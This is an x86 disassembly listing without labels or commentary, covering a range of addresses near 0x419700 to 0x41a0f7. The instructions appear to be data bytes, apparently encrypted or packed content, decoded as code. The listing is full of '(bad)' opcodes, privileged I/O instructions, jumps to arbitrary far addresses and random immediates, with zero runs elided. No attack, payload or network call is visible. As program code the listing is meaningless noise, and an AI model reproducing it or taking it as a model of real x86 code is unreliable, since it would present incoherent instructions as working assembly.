  4196a2:	jp     0x4196a1
  4196a4:	dec    edi
  4196a5:	sti    
  4196a6:	(bad)  
  4196a7:	out    0x62,eax
  4196a9:	and    ah,BYTE PTR [edi+0x45ed5818]
  4196af:	adc    BYTE PTR [esi],0x49
  4196b2:	bound  ebp,QWORD PTR [esi+ecx*2-0x54]
  4196b6:	hlt    
  4196b7:	inc    ebx
  4196b8:	cmp    ecx,DWORD PTR [ecx+0x5523da0e]
  4196be:	pop    ecx
  4196bf:	add    BYTE PTR [ebx],cl
  4196c1:	or     al,0xf9
  4196c3:	sub    eax,0xd27a19a8
  4196c8:	out    dx,al
  4196c9:	sub    eax,0x84284232
  4196ce:	xor    bh,BYTE PTR [ecx+edx*8-0x73ac8da7]
  4196d5:	pop    eax
  4196d6:	dec    ebp
  4196d7:	lods   eax,DWORD PTR ds:[esi]
  4196d8:	jae    0x419732
  4196da:	cmc    
  4196db:	mov    eax,0x230ebd2
  4196e0:	dec    eax
  4196e1:	ja     0x419735
  4196e3:	fldcw  WORD PTR [esi-0x750cda56]
  4196e9:	mov    esp,0xda3ff67f
  4196ee:	clc    
  4196ef:	sbb    BYTE PTR [edi-0x1a],bl
  4196f2:	jg     0x4196be
  4196f4:	xor    al,0x41
  4196f6:	add    dl,BYTE PTR [ebx+0x4b]
  4196f9:	or     DWORD PTR fs:[ebx],ebx
  4196fc:	adc    esi,DWORD PTR [ebx]
  4196fe:	iret   
  4196ff:	sub    DWORD PTR [eax+0x4d0069ac],0xb8c7262f
  419709:	popf   
  41970a:	sub    al,0x75
  41970c:	pop    ebx
  41970d:	fnsave [edi-0x44]
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0xa48dd0ae
  419781:	mov    bh,0x55
  419783:	das    
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	adc    DWORD PTR [eax],esp
  41978e:	test   BYTE PTR [esi+0x71674004],ch
  419794:	(bad)  
  419795:	jmp    DWORD PTR ds:0x7febfe1b
  41979b:	out    dx,al
  41979c:	cdq    
  41979d:	or     al,0x9d
  41979f:	daa    
  4197a0:	push   esp
  4197a1:	jns    0x419818
  4197a3:	and    BYTE PTR [edx],bl
  4197a5:	loope  0x4197c5
  4197a7:	fdivr  DWORD PTR [esi+0x68]
  4197aa:	sub    dl,BYTE PTR [eax]
  4197ac:	push   cs
  4197ad:	popf   
  4197ae:	push   esp
  4197af:	(bad)  
  4197b3:	sub    al,0x59
  4197b5:	pop    ebp
  4197b6:	xchg   esi,eax
  4197b7:	mov    dh,0xf
  4197b9:	xchg   bh,ah
  4197bb:	jae    0x4197e5
  4197bd:	xchg   ecx,eax
  4197be:	xor    eax,0x12fef30c
  4197c3:	mov    ds:0x1891d794,al
  4197c8:	(bad)  
  4197c9:	xchg   esp,eax
  4197ca:	fisubr WORD PTR [edi]
  4197cc:	inc    eax
  4197cd:	and    bh,0x44
  4197d0:	mov    ebx,0xcaf2c839
  4197d5:	or     eax,0x9edfe46e
  4197da:	fist   WORD PTR [ebx-0x113838fa]
  4197e0:	jmp    FWORD PTR [edi*8+0x733263b3]
  4197e7:	in     eax,dx
  4197e8:	(bad)  
  4197ea:	sbb    DWORD PTR [esi],0xffffffb1
  4197ed:	fimul  WORD PTR [ebx+0x44]
  4197f0:	cwde   
  4197f1:	push   ds
  4197f2:	mov    esi,eax
  4197f4:	inc    edx
  4197f5:	hlt    
  4197f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197f7:	fucomi st,st(1)
  4197f9:	lahf   
  4197fa:	dec    ecx
  4197fb:	mov    edx,0xe1e1e6b5
  419800:	sub    DWORD PTR [ecx-0x7],edi
  419803:	jb     0x419832
  419805:	mov    ch,0xf7
  419807:	lds    ecx,FWORD PTR [ebx-0x15]
  41980a:	adc    eax,0x5344cfc6
  41980f:	add    BYTE PTR [esi],0x39
  419812:	pop    edi
  419813:	shr    BYTE PTR [ecx+0x6ddc04e],cl
  419819:	das    
  41981a:	ret    
  41981b:	push   esi
  41981c:	(bad)  
  41981d:	push   esp
  41981e:	or     al,0x2e
  419820:	aad    0x9
  419822:	xor    esp,ecx
  419824:	pop    edi
  419825:	pusha  
  419826:	enter  0xb65e,0x1d
  41982a:	test   al,0xf2
  41982c:	inc    esp
  41982d:	iret   
  41982e:	add    DWORD PTR [ebx-0x56c0d022],0x51
  419835:	cmp    al,0x5a
  419837:	cmp    eax,0x779e5a1b
  41983c:	js     0x419834
  41983e:	repz pop esi
  419840:	pop    ebp
  419841:	mov    ebx,0xbe3f36e0
  419846:	ins    BYTE PTR es:[edi],dx
  419847:	mov    ebp,cs
  419849:	outs   dx,BYTE PTR ds:[esi]
  41984a:	push   ebx
  41984b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41984c:	add    BYTE PTR [ebp+0x15],dh
  41984f:	popa   
  419850:	fld    QWORD PTR [esi]
  419852:	inc    edi
  419853:	shr    BYTE PTR [ebp+edi*2+0x3],cl
  419857:	pop    ecx
  419859:	sub    ebp,DWORD PTR [eax+0x4b96d6b8]
  41985f:	xchg   BYTE PTR [esi],dh
  419861:	test   dh,dl
  419863:	xchg   ecx,eax
  419864:	call   0x64470786
  419869:	iret   
  41986a:	push   ecx
  41986b:	cwde   
  41986c:	sub    bl,al
  41986e:	in     eax,0x3c
  419870:	inc    edx
  419871:	inc    ecx
  419872:	les    ecx,FWORD PTR ds:0x535934f6
  419878:	add    edi,ebp
  41987a:	jne    0x4198ca
  41987c:	sti    
  41987d:	push   edi
  41987e:	(bad)  
  41987f:	dec    ecx
  419880:	(bad)  [edi+0x77]
  419883:	sub    ebx,DWORD PTR [edx]
  419885:	div    BYTE PTR [esp-0x6e53d595]
  41988c:	add    al,0x6f
  41988e:	xchg   edx,eax
  41988f:	mov    dh,0x0
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fst    QWORD PTR [ebp+0x50]
  419902:	je     0x41992d
  419904:	int3   
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	jge    0x419975
  41990e:	call   0xb3fc:0xccecfb09
  419915:	jp     0x41998e
  419917:	sub    bl,BYTE PTR [esi+0x73]
  41991a:	fstp   TBYTE PTR [ebx+0x20]
  41991d:	into   
  41991e:	outs   dx,DWORD PTR ds:[esi]
  41991f:	pop    es
  419920:	jp     0x41992a
  419922:	dec    eax
  419923:	pop    esp
  419924:	jmp    0x7e0ea8f2
  419929:	outs   dx,BYTE PTR ds:[esi]
  41992a:	mov    ah,0xd
  41992c:	cli    
  41992d:	and    al,0x98
  41992f:	sbb    al,bl
  419931:	push   ecx
  419932:	gs stos DWORD PTR es:[edi],eax
  419934:	out    dx,al
  419935:	inc    ebp
  419936:	addr16 into 
  419938:	mov    eax,0xa68fb8e2
  41993d:	adc    edi,ebp
  41993f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419940:	mov    DWORD PTR [edi-0x52d9f35c],edi
  419946:	repnz nop
  419948:	xchg   edi,eax
  419949:	mov    al,BYTE PTR [ecx-0x40]
  41994c:	xor    DWORD PTR [ebx-0x159cfebf],0x28440938
  419956:	mov    dl,0xbc
  419958:	sbb    DWORD PTR [ecx+0x2e],0x50
  41995c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41995d:	adc    ebp,DWORD PTR [ebp-0x501ca47b]
  419963:	sbb    eax,0xaa9b621a
  419968:	stos   BYTE PTR es:[edi],al
  419969:	or     DWORD PTR [esi+0x6c5e763a],esi
  41996f:	jb     0x4198f6
  419971:	gs push ss
  419973:	inc    ebp
  419974:	test   DWORD PTR [ecx+0x1f],0x603cdcc5
  41997b:	jbe    0x4199cc
  41997d:	fnsave [esi-0x1e]
  419980:	outs   dx,DWORD PTR ds:[esi]
  419981:	enter  0x7733,0xee
  419985:	cmc    
  419986:	mov    DWORD PTR [ecx-0x59],esi
  419989:	dec    ebx
  41998a:	shr    BYTE PTR [ebp+0x6d],cl
  41998d:	inc    ebx
  41998e:	out    0xd5,eax
  419990:	pop    esp
  419991:	xchg   edi,eax
  419992:	pop    ebx
  419993:	dec    ebp
  419994:	pop    edx
  419995:	mov    al,0x41
  419997:	scas   al,BYTE PTR es:[edi]
  419998:	push   0x45
  41999a:	mov    eax,ds:0xe2353393
  41999f:	test   ch,bh
  4199a1:	pop    es
  4199a2:	dec    eax
  4199a3:	neg    BYTE PTR ds:0xca039f31
  4199a9:	fwait
  4199aa:	retf   
  4199ab:	test   BYTE PTR [ebx+eiz*1-0x52db6ef2],dh
  4199b2:	je     0x419935
  4199b4:	jne    0x41998a
  4199b6:	mov    eax,ds:0x29dabe0f
  4199bb:	sbb    al,bh
  4199bd:	popf   
  4199be:	or     bl,al
  4199c0:	add    eax,0x6b275104
  4199c5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199c7:	inc    ecx
  4199c8:	mov    BYTE PTR [ecx+0x45],ch
  4199cb:	fs mov edi,0x757f83b2
  4199d1:	pop    esi
  4199d2:	xchg   BYTE PTR [esi-0x45],al
  4199d5:	mov    ah,0x1b
  4199d7:	dec    eax
  4199d8:	xor    esp,DWORD PTR [esi+0x1a]
  4199db:	dec    ecx
  4199dc:	(bad)  
  4199dd:	mov    edi,0x4c593968
  4199e2:	mov    ebx,esi
  4199e4:	outs   dx,DWORD PTR ds:[esi]
  4199e5:	leave  
  4199e6:	retf   
  4199e7:	out    dx,al
  4199e8:	lock or cl,BYTE PTR [esp+ebx*2-0x6e3762cc]
  4199f0:	inc    ecx
  4199f1:	fsubr  st(4),st
  4199f3:	sbb    BYTE PTR [ecx+ebx*8],0x7e
  4199f7:	cmp    eax,0x997a53d6
  4199fc:	jmp    0xed8af3a3
  419a01:	mov    ch,0x2
  419a03:	dec    eax
  419a04:	int    0xee
  419a06:	pop    ss
  419a07:	sahf   
  419a08:	add    al,dl
  419a0a:	inc    esi
  419a0b:	and    DWORD PTR [edi-0xd],0xf665
	...
  419a72:	add    BYTE PTR [eax],al
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x5cb795c2,cl
  419a83:	out    0xd0,al
  419a85:	sgdtd  [eax]
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	fld    st(1)
  419a8e:	cmp    ebx,DWORD PTR [ecx-0x3cc84e55]
  419a94:	not    BYTE PTR [eax]
  419a96:	mov    dh,0x11
  419a98:	outs   dx,BYTE PTR ds:[esi]
  419a99:	or     eax,0xddcfae85
  419a9e:	out    0xa8,al
  419aa0:	aaa    
  419aa1:	out    0x3c,al
  419aa3:	jp     0x419afd
  419aa5:	mov    ds:0x4d824613,eax
  419aaa:	or     al,0x68
  419aac:	les    ebx,FWORD PTR [ecx]
  419aae:	mov    eax,DWORD PTR [edi+0x2b7a281d]
  419ab4:	scas   ax,WORD PTR es:[edi]
  419ab6:	scas   eax,DWORD PTR es:[edi]
  419ab7:	sahf   
  419ab8:	in     al,0x64
  419aba:	lods   al,BYTE PTR ds:[esi]
  419abb:	mov    ch,0x26
  419abd:	hlt    
  419abe:	retf   
  419abf:	and    eax,0x176fd757
  419ac4:	xor    BYTE PTR [edx-0x5fc8cad3],dh
  419aca:	in     al,dx
  419acb:	ss and al,0x6b
  419ace:	retf   0x921e
  419ad1:	or     eax,0xe10e0f4a
  419ad6:	xor    DWORD PTR [ebx+eiz*1-0x43],0xcedab3f5
  419ade:	repz push cs
  419ae0:	in     al,dx
  419ae1:	cld    
  419ae2:	xchg   esp,eax
  419ae3:	call   0x8b05a277
  419ae8:	ret    
  419ae9:	lock cwde 
  419aeb:	imul   eax,DWORD PTR [ebp+0x3dadf964],0xffffffa0
  419af2:	add    BYTE PTR [eax],dh
  419af4:	add    edi,esp
  419af6:	mov    al,ds:0xa3e3412d
  419afb:	ret    
  419afc:	ins    DWORD PTR es:[edi],dx
  419afd:	in     eax,dx
  419afe:	pop    ebx
  419aff:	retf   
  419b00:	jmp    0x6b8e:0xcb56c7f7
  419b07:	and    dl,BYTE PTR [ecx-0x40b859e4]
  419b0d:	sbb    ecx,DWORD PTR [ecx+0x32]
  419b10:	pop    esp
  419b12:	mov    BYTE PTR [ebp+0x6],bl
  419b15:	or     ebx,esi
  419b17:	push   0x78097797
  419b1c:	fldenv [eax]
  419b1e:	data16 hlt 
  419b20:	loop   0x419b14
  419b22:	lahf   
  419b23:	adc    BYTE PTR [ebx-0x59e24bb3],dh
  419b29:	cmp    DWORD PTR [edi-0xd],0x5
  419b2d:	sti    
  419b2e:	stos   DWORD PTR es:[edi],eax
  419b2f:	push   0xffffffdf
  419b31:	sub    eax,0x98cd012e
  419b36:	scas   eax,DWORD PTR es:[edi]
  419b37:	(bad)  
  419b38:	jns    0x419af9
  419b3a:	hlt    
  419b3b:	sub    DWORD PTR [edi],edx
  419b3d:	out    0x35,eax
  419b3f:	(bad)  
  419b40:	cmp    edx,edi
  419b42:	cs fwait
  419b44:	cmp    bl,al
  419b46:	mov    dl,0x21
  419b48:	cmp    dh,BYTE PTR [ebx-0x36]
  419b4b:	pusha  
  419b4c:	(bad)  
  419b4d:	(bad)  [edi]
  419b4f:	mov    ebx,0x9d452ae2
  419b54:	inc    ecx
  419b55:	jle    0x419b51
  419b57:	mov    eax,0xc349d201
  419b5c:	mov    bh,0xcf
  419b5e:	cli    
  419b5f:	icebp  
  419b60:	rcl    BYTE PTR [ecx+eax*2],1
  419b63:	leave  
  419b64:	idiv   BYTE PTR [ebx+0x6fabf6c4]
  419b6a:	enter  0x58bc,0xdb
  419b6e:	popf   
  419b6f:	mov    edx,0x897e402b
  419b74:	rcl    dh,cl
  419b76:	sub    DWORD PTR [esi+0x6359e03c],ebx
  419b7c:	add    al,0xf7
  419b7e:	inc    ecx
  419b7f:	je     0x419b8a
  419b81:	fadd   st,st(3)
  419b83:	mov    WORD PTR [esi-0x1c0a588c],cs
  419b89:	arpl   bp,dx
  419b8b:	dec    edi
  419b8c:	iret   
  419b8d:	inc    ecx
  419b8e:	retf   0x7a
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x9d
  419c01:	shr    bh,0x8a
  419c04:	aam    0x10
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	nop
  419c0d:	or     dl,BYTE PTR [eax*1-0x72df46a7]
  419c14:	pop    ebp
  419c15:	test   al,0x1b
  419c17:	clc    
  419c18:	xchg   esi,eax
  419c19:	mov    eax,ds:0x9cb9ee0b
  419c1e:	nop
  419c1f:	in     al,0xf4
  419c21:	imul   esi,DWORD PTR [edi+0x3],0xffffffc9
  419c25:	test   al,0x39
  419c27:	mov    esp,ss
  419c29:	loop   0x419be3
  419c2b:	pop    eax
  419c2c:	push   cs
  419c2d:	mov    ebx,0xd3b854a0
  419c32:	mov    edx,0xea7b993e
  419c37:	dec    edx
  419c38:	add    BYTE PTR [ecx+0x5b],al
  419c3b:	or     ebp,DWORD PTR [ebx-0x6c]
  419c3e:	mov    ds:0x47f55187,eax
  419c43:	or     dh,BYTE PTR [esi+0x23]
  419c46:	jmp    0x8aa2:0xd12d0dbb
  419c4d:	(bad)  
  419c4e:	cmp    DWORD PTR [edi+eiz*1+0x5bd00c9b],esi
  419c55:	pop    ecx
  419c56:	and    al,0xfb
  419c58:	and    BYTE PTR [edi+0x29],0x3d
  419c5c:	jae    0x419cbb
  419c5e:	sub    eax,edx
  419c60:	aaa    
  419c61:	das    
  419c62:	jns    0x419ccb
  419c64:	sbb    ecx,DWORD PTR [ecx+0xc34a600]
  419c6a:	push   ss
  419c6b:	data16 or BYTE PTR [ecx],ch
  419c6e:	daa    
  419c6f:	and    al,bl
  419c71:	js     0x419c9b
  419c73:	push   0x4f6e12cd
  419c78:	lock pop ds
  419c7a:	pextrw esp,(bad),0xc5
  419c7c:	mov    ds:0x568ff89c,al
  419c81:	popa   
  419c82:	push   ebx
  419c83:	jne    0x419c12
  419c85:	enter  0xb628,0x9f
  419c89:	adc    eax,0xa4514cb1
  419c8e:	pop    ds
  419c8f:	and    DWORD PTR [edx+ecx*2-0x4c81b13b],0xe01bd85
  419c9a:	js     0x419cb1
  419c9c:	das    
  419c9d:	xlat   BYTE PTR ds:[ebx]
  419c9e:	daa    
  419c9f:	push   edi
  419ca0:	and    dh,BYTE PTR [edi]
  419ca2:	dec    esp
  419ca3:	inc    esp
  419ca4:	and    BYTE PTR [esi],dh
  419ca6:	in     al,dx
  419ca7:	push   0xc44cdbbe
  419cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cad:	xchg   edx,eax
  419cae:	inc    ebx
  419caf:	mov    bl,0xcb
  419cb1:	jae    0x419d15
  419cb3:	sar    DWORD PTR [ebx],1
  419cb5:	data16 sti 
  419cb7:	or     eax,DWORD PTR [esi-0x38]
  419cba:	push   edx
  419cbb:	shr    ecx,1
  419cbd:	cdq    
  419cbe:	cs js  0x419cca
  419cc1:	add    eax,0xbaf777fc
  419cc6:	shl    DWORD PTR [ebx],1
  419cc8:	mov    ebx,0xe2b3b15
  419ccd:	loopne 0x419c78
  419ccf:	jl     0x419d20
  419cd1:	outs   dx,BYTE PTR ds:[esi]
  419cd2:	(bad)  
  419cd3:	daa    
  419cd4:	outs   dx,DWORD PTR ds:[esi]
  419cd5:	pop    edi
  419cd6:	adc    DWORD PTR [ebx],0xa4a5a5ae
  419cdc:	sbb    BYTE PTR [ebx+0x30c627a2],cl
  419ce2:	cmp    al,0xd3
  419ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ce5:	push   ecx
  419ce6:	add    cl,BYTE PTR [ebx]
  419ce8:	cmpps  xmm1,XMMWORD PTR [ebx+ecx*8],0xf0
  419ced:	inc    edx
  419cee:	pop    eax
  419cef:	cmp    esp,DWORD PTR [ebx+0x59e311aa]
  419cf5:	rol    BYTE PTR [edx+0x57],1
  419cf8:	sbb    DWORD PTR [edi+0x64],edi
  419cfb:	mov    ebx,0x44c1a0e2
  419d00:	das    
  419d01:	pop    esp
  419d02:	lahf   
  419d03:	enter  0x4a82,0x4a
  419d07:	lds    esp,FWORD PTR [eax-0x61275597]
  419d0d:	jmp    0x4210bc
	...
  419d72:	add    BYTE PTR [eax],al
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fisubr DWORD PTR ss:[edx+eax*4+0x4a]
  419d83:	add    eax,0x111d8
  419d88:	add    al,0x1
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	inc    esi
  419d8d:	mov    al,0xd
  419d8f:	aad    0x3b
  419d91:	sti    
  419d92:	leave  
  419d93:	jo     0x419d85
  419d95:	sub    eax,DWORD PTR [edx+0x5]
  419d98:	push   eax
  419d99:	xor    ah,bh
  419d9b:	or     DWORD PTR [esi],0x8
  419d9e:	and    DWORD PTR [ebx-0x50831515],edx
  419da4:	xchg   ecx,eax
  419da5:	lea    esi,[edi-0x1e785cbc]
  419dab:	pop    esi
  419dac:	int3   
  419dad:	mov    edx,0x826c237f
  419db2:	mov    DWORD PTR ds:0xfd1876aa,ecx
  419db8:	xchg   esp,eax
  419db9:	pop    ebp
  419dba:	je     0x419db6
  419dbc:	popa   
  419dbd:	dec    esi
  419dbe:	aad    0x52
  419dc0:	dec    edx
  419dc1:	mov    ebx,0x2333fb82
  419dc6:	je     0x419d71
  419dc8:	enter  0xe805,0xba
  419dcc:	jns    0x419e10
  419dce:	xchg   esi,eax
  419dcf:	cmc    
  419dd0:	test   al,0xa8
  419dd2:	mov    esi,0x4a27daef
  419dd7:	leave  
  419dd8:	mov    esp,0x2dac9d9b
  419ddd:	and    al,0x2d
  419ddf:	pop    ds
  419de0:	cmp    ecx,edi
  419de2:	imul   esi,edx,0x24a8508f
  419de8:	lea    ebx,[ecx+ebx*4]
  419deb:	push   cs
  419dec:	mov    edx,0xe09a18c1
  419df1:	xor    esi,DWORD PTR [edx-0x3c304187]
  419df7:	sbb    esp,edi
  419df9:	mov    edi,0x481f0e11
  419dfe:	or     DWORD PTR [ebp+0x1019bade],esi
  419e04:	jg     0x419e6c
  419e06:	cld    
  419e07:	lods   eax,DWORD PTR ds:[esi]
  419e08:	xchg   DWORD PTR [ecx-0x5a8e215e],eax
  419e0e:	ret    
  419e0f:	mov    dl,0x7a
  419e11:	ret    
  419e12:	sbb    al,0xfa
  419e14:	ins    BYTE PTR es:[edi],dx
  419e15:	cmp    DWORD PTR [ebx],0xffffffe7
  419e18:	dec    edi
  419e19:	popf   
  419e1a:	mov    edi,esi
  419e1c:	ds jmp 0x12e337cf
  419e22:	repnz retf 0xeba9
  419e26:	ds pop edi
  419e28:	popa   
  419e29:	les    ebx,FWORD PTR [eax]
  419e2b:	loope  0x419e79
  419e2d:	sub    al,0xc6
  419e2f:	inc    edx
  419e30:	jp     0x419dd2
  419e32:	add    DWORD PTR [eax+ebx*4-0x26],esp
  419e36:	clc    
  419e37:	into   
  419e38:	fbld   TBYTE PTR ds:0x4f9e060
  419e3e:	aaa    
  419e3f:	dec    ecx
  419e40:	ret    
  419e41:	add    BYTE PTR [eax],0x2c
  419e44:	cmp    al,0x74
  419e46:	pop    edx
  419e47:	xchg   edi,eax
  419e48:	jno    0x419e71
  419e4a:	or     esp,edx
  419e4c:	xor    al,BYTE PTR [edi-0x1e51c4db]
  419e52:	lds    esi,FWORD PTR [ebp+0x1d072a34]
  419e58:	xor    DWORD PTR [eax-0x3],ebp
  419e5b:	cmp    eax,0xd301cedc
  419e60:	pusha  
  419e61:	aaa    
  419e62:	xor    BYTE PTR [ebx-0x4ed3db3f],cl
  419e68:	ds xchg ebx,eax
  419e6a:	enter  0x81bb,0xb0
  419e6e:	xchg   esp,eax
  419e6f:	pop    es
  419e70:	sbb    esi,esp
  419e72:	xchg   BYTE PTR [esi+0x25],al
  419e75:	push   ebp
  419e76:	jne    0x419e8e
  419e78:	pop    edi
  419e79:	shr    BYTE PTR [eax+edx*8],1
  419e7c:	ds push ebx
  419e7e:	pop    ss
  419e7f:	push   ds
  419e80:	popf   
  419e81:	xlat   BYTE PTR ds:[ebx]
  419e82:	inc    eax
  419e83:	in     eax,0x14
  419e85:	push   ds
  419e86:	in     eax,dx
  419e87:	pushf  
  419e88:	add    BYTE PTR [ecx+0x14],dh
  419e8b:	sbb    al,0x4f
  419e8d:	ds adc eax,0xe8
	...
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	test   DWORD PTR [ebx],ebx
  419f02:	ret    
  419f03:	test   esp,ebx
  419f05:	adc    al,BYTE PTR [ecx]
  419f07:	add    BYTE PTR [ecx+eax*1],al
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	fild   QWORD PTR [esi+0x78d0321e]
  419f12:	xchg   esi,eax
  419f13:	fs mov ecx,0xddf31f67
  419f19:	pop    ds
  419f1a:	fwait
  419f1b:	xor    ah,dh
  419f1d:	int3   
  419f1e:	pop    edi
  419f1f:	xchg   esp,eax
  419f20:	mov    ecx,0x93f853e6
  419f25:	add    DWORD PTR [ecx-0x43],eax
  419f28:	push   eax
  419f29:	mov    esp,DWORD PTR [ebx]
  419f2b:	dec    ebx
  419f2c:	xchg   BYTE PTR [ebp+eax*8-0x5a],ah
  419f30:	jg     0x419f16
  419f32:	add    DWORD PTR [ecx+0x38],esi
  419f35:	sti    
  419f36:	mov    ebp,0x193abbee
  419f3b:	add    eax,0x430d4341
  419f40:	pop    eax
  419f41:	dec    esp
  419f42:	cmp    al,0x69
  419f44:	mov    esp,0x3273edf8
  419f49:	(bad)  
  419f4a:	pop    ss
  419f4b:	pop    esp
  419f4c:	lds    edi,FWORD PTR [ebp+ecx*4+0x588c4ac8]
  419f53:	sub    eax,0x46eceb69
  419f58:	fist   DWORD PTR [edi+esi*8]
  419f5b:	popf   
  419f5c:	dec    ebx
  419f5d:	or     al,0x37
  419f5f:	cdq    
  419f60:	cmp    edi,edx
  419f62:	rcr    DWORD PTR [esi],0xaf
  419f65:	mov    ds:0xb5943d5f,al
  419f6a:	and    al,0xf2
  419f6c:	pop    ebp
  419f6d:	pop    ebp
  419f6e:	cdq    
  419f6f:	jp     0x419f36
  419f71:	sbb    BYTE PTR [edx-0x24],0x27
  419f75:	out    dx,eax
  419f76:	jl     0x419feb
  419f78:	cs jmp 0x7dee:0x269cb33
  419f80:	out    dx,eax
  419f81:	loopne 0x419f58
  419f83:	adc    eax,0x59e4c881
  419f88:	add    al,0xd3
  419f8a:	jmp    0x8a42:0x5fbe1e86
  419f91:	in     eax,dx
  419f92:	data16 fild QWORD PTR ds:0x4ce51dc1
  419f99:	or     ebx,esi
  419f9b:	push   ds
  419f9c:	fidivr DWORD PTR [eax]
  419f9e:	clc    
  419f9f:	sbb    bl,BYTE PTR [eax-0x4dbada50]
  419fa5:	js     0x419f5c
  419fa7:	retf   0x353b
  419faa:	xor    bl,BYTE PTR [esi-0x43]
  419fad:	mov    ecx,0x337a2f54
  419fb2:	push   cs
  419fb3:	push   esp
  419fb4:	mov    dh,0xe8
  419fb6:	sbb    DWORD PTR [esi],edi
  419fb8:	inc    ecx
  419fb9:	pop    ss
  419fba:	fnstsw WORD PTR [edx-0x64]
  419fbd:	emms   
  419fbf:	(bad)  
  419fc0:	sub    al,0x85
  419fc2:	gs jmp 0x3dbcc9f7
  419fc8:	inc    edi
  419fc9:	push   0x76
  419fcb:	add    ah,bl
  419fcd:	mov    esi,0xbc03c3f2
  419fd2:	lahf   
  419fd3:	iret   
  419fd4:	push   edx
  419fd5:	lock pop ebx
  419fd7:	inc    eax
  419fd8:	mov    eax,0xef8d9d51
  419fdd:	lds    esi,FWORD PTR [ecx-0x6efda3f9]
  419fe3:	sub    al,0x10
  419fe5:	lahf   
  419fe6:	shr    BYTE PTR [esi],1
  419fe8:	mov    ch,0x5b
  419fea:	rcr    ebx,cl
  419fec:	test   eax,0xbeab718
  419ff1:	mov    ebp,0xe3f0df4b
  419ff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ff7:	sub    eax,0xb829c9de
  419ffc:	es sub eax,0x7dedf5cd
  41a002:	data16 jp 0x419fd2
  41a005:	pop    es
  41a006:	jo     0x419fa2
  41a008:	punpckhbw mm7,QWORD PTR [edx+ebx*8]
  41a00c:	les    edi,FWORD PTR [esi-0x9]
  41a00f:	mov    ebx,0x0
	...
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x16],bh
  41a081:	js     0x41a067
  41a083:	(bad)  
  41a084:	loopne 0x41a099
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    al,0x1
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	ret    0xdc91
  41a08f:	dec    BYTE PTR [esi]
  41a091:	mov    eax,DWORD PTR ds:0xeb96d978
  41a097:	(bad)  
  41a098:	mov    DWORD PTR [edx-0x68],edi
  41a09b:	inc    edi
  41a09c:	cmp    BYTE PTR [ebp-0x78e81536],0x89
  41a0a3:	daa    
  41a0a4:	sub    DWORD PTR [edi+0x29],0xffffffb9
  41a0a8:	dec    esi
  41a0a9:	retf   
  41a0aa:	inc    edi
  41a0ab:	push   esp
  41a0ac:	sub    esp,DWORD PTR [edi]
  41a0ae:	rol    dh,cl
  41a0b0:	push   eax
  41a0b1:	in     eax,dx
  41a0b2:	imul   ebp,eax,0x26
  41a0b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b6:	loop   0x41a09a
  41a0b8:	arpl   WORD PTR [ebx],dx
  41a0ba:	or     al,0x83
  41a0bc:	jg     0x41a061
  41a0be:	xor    al,0x93
  41a0c0:	sub    DWORD PTR [ebx+0x671c7cb6],esp
  41a0c6:	or     DWORD PTR [ecx+0x359a07f4],ebx
  41a0cc:	test   al,0x63
  41a0ce:	push   cs
  41a0cf:	xchg   esi,eax
  41a0d0:	dec    esp
  41a0d1:	mov    BYTE PTR [edx+eax*8-0x36],dh
  41a0d5:	scas   al,BYTE PTR es:[edi]
  41a0d6:	jne    0x41a09c
  41a0d8:	shl    DWORD PTR [esi],1
  41a0da:	xor    DWORD PTR ds:0x8c317af7,ebx
  41a0e0:	nop
  41a0e1:	push   eax
  41a0e2:	mov    ds:0xcf5707d9,al
  41a0e7:	xchg   esi,eax
  41a0e8:	jle    0x41a13a
  41a0ea:	push   ecx
  41a0eb:	inc    ebp
  41a0ec:	cmp    eax,0x67ea105d
  41a0f1:	xor    BYTE PTR [ebx],bl
  41a0f3:	push   esp
  41a0f4:	fidivr WORD PTR [edi-0xd]
  41a0f7:	jns    0x41a0bc
